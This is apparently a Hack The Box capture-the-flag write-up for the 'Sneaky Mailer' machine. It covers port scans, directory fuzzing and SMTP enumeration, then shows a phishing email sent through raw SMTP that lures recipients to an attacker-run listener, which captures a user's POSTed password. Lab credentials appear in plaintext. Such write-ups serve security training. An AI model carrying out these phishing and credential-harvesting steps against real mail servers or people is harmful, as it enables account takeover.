# Sneaky Mailer

Machine IP: 10.10.10.197

# Foothold

## Scanning

A quick scan on common 1000 ports.

```s
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
993/tcp  open  ssl/imap Courier Imapd (released 2018)
8080/tcp open  http     nginx 1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

A more thorough connect scan through all ports.

```s
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
993/tcp  open  ssl/imap Courier Imapd (released 2018)
8080/tcp open  http     nginx 1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 21

- Anonymous login not supported.

From the mails retrieved from Paul's email account (port 143), we have the credentials now.

```s
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```

Exploring the ftp server reveals a `pypi` folder with a `register.php` file within in.

## Port 22

The `developer -  m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C` tuple is not working in SSH.

## Port 80

Website: http://10.10.10.197:80

- An employee dashboard throws up. Logout doesn't work.

- A curious thing happens with wfuzz. `wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://10.10.10.197:80/FUZZ` gives all payloads as `301` or `moved permanently`. And it makes sense. Even in the browser, `http://10.10.10.197:80` leads to `http://sneakycorp.htb/`. So a `wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://sneakycorp.htb/FUZZ` works.

- `POP3` and `SMTP` are fully tested and (maybe) running. While `PyPI` is 80% testing complete. It is possible to use `pip` to install modules on the server.

- `nginx 1.14.2` server running up. Generic `Not Found` page present giving away version info for the server.

- There is one notification (welcome notification) and 4 messages that aren't opening. 

- POP3 is said to be complete on the website but the port 110 is closed

Dirbuster output:

```s
Dir found: / - 200
Dir found: /img/ - 403
Dir found: /css/ - 403
Dir found: /js/ - 403
File found: /index.php - 200
Dir found: /vendor/ - 403
File found: /team.php - 200
Dir found: /vendor/jquery/ - 403
Dir found: /vendor/bootstrap/ - 403
Dir found: /vendor/bootstrap/js/ - 403
Dir found: /vendor/jquery-easing/ - 403
File found: /vendor/jquery-easing/jquery.easing.min.js - 200
File found: /vendor/jquery/jquery.min.js - 200
File found: /js/sb-admin-2.min.js - 200
Dir found: /vendor/chart.js/ - 403
File found: /vendor/bootstrap/js/bootstrap.bundle.min.js - 200
Dir found: /js/demo/ - 403
File found: /js/demo/chart-area-demo.js - 200
File found: /js/demo/chart-pie-demo.js - 200
File found: /vendor/chart.js/Chart.min.js - 200
Dir found: /pypi/ - 403
```

- The [team](http://sneakycorp.htb/team.php) page has a lot of emails to try stuff on.

An attack vector gets from `http://sneakycorp.htb/pypi/register.php` which comes from ftp server. We create an account. The fields in the form are `firstName`, `lastName`, `email`, `password`, and `rpassword` (`rpassword` denotes the repeat password in the form).

## Port 8080

Website: http://10.10.10.197:8080/

- A generic `nginx` page. Default page welcoming the user and informing about installation of the server.

## Port 25

- A `smtp   Postfix smtpd` is running on port 25. There are a couple of amazing msf modules: `auxiliary/scanner/smtp/smtp_enum` and `use auxiliary/scanner/smtp/smtp_version`.

- `smtp_enum` enumerates the list of users on the given smtp server. In our case, the following list came up: `avahi-autoipd, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postmaster, proxy, sshd, sync, sys, uucp, www-data`

- `smtp_version`: 220 debian ESMTP Postfix (Debian/GNU)\x0d\x0a

- `nmap --script smtp-enum-users.nse -p 25 10.10.10.197` returns an unhandled status code.

- Exploit on [shellshock](https://www.exploit-db.com/exploits/34896) not working.

Note the stmp on port 25 is allowing an external user to issue commands to it. We might have used `theHarvester` or something to try and get email addresses from `hunter`[https://hunter.io/]. Verifying that the `VRFY` command works on this mail server, we perform an email phishing attack.

First we get the email addresses from the website through `cewl -e --email_file emails http://sneakycorp.htb/`. Then we attack through `telnet 10.10.10.197 25`. `MAIL FROM:` any random mail. `RCPT TO:` all the mail addresses.

```s
DATA
From: manwe
Subject: Ping at http://10.10.14.242:80
Dear recipients, Please be kind enough to ping me at http://10.10.14.242:80
.


POST / HTTP/1.1
Host: 10.10.14.242
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&
lastName=Byrd&
email=paulbyrd%40sneakymailer.htb&
password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&
rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

```

From `Content-Type`, it is clear that the response is urlencoded. Thus, decoding the encoded url, we get the password as ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht. The question to think about what password is this. After trying out a series of things, it turns out this the email's password itself. Which is intuitive, since before the password we have the email in the POST.

We set up `Evolution` and specify the server/port for IMAP and SMTP (and other services as well). There are two mails I got:

```s
From:	Paul Byrd <paulbyrd@sneakymailer.htb>
To:	low@debian
Subject:	Module testing
Date:	Wed, 27 May 2020 13:28:58 -0400 (27/05/20 10:58:58 PM IST)
Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.


From:	Paul Byrd <paulbyrd@sneakymailer.htb>
To:	root <root@debian>
Subject:	Password reset
Date:	Fri, 15 May 2020 13:03:37 -0500 (15/05/20 11:33:37 PM IST)
Hello administrator, I want to change this password for the developer account
 
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 
Please notify me when you do it
```

Thus, Paul mailed `root@debian` regarding change in password for the developer account.

## Port 143

Imap (Internet Message Access Protocol) means some sort of ISP is involved with the emails and stuff. Port 143 means the emails are unencrypted. And port 993 is the more secure version of 143.

- Banner grabbing and sending simple IMAP command to the server `nc -nv 10.10.10.197 143`. (`-n` basically is the IP address provided will be a numeric address and not a DNS. While `-v` means verbosity).

- `nmap` scanning of the imap port: `nmap --script=/usr/share/nmap/scripts/imap-ntlm-info.nse 10.10.10.197 -p143 -sV -sC`

```s
PORT    STATE SERVICE VERSION
143/tcp open  imap    Courier Imapd (released 2018)
```

We have the version number for the imap now.
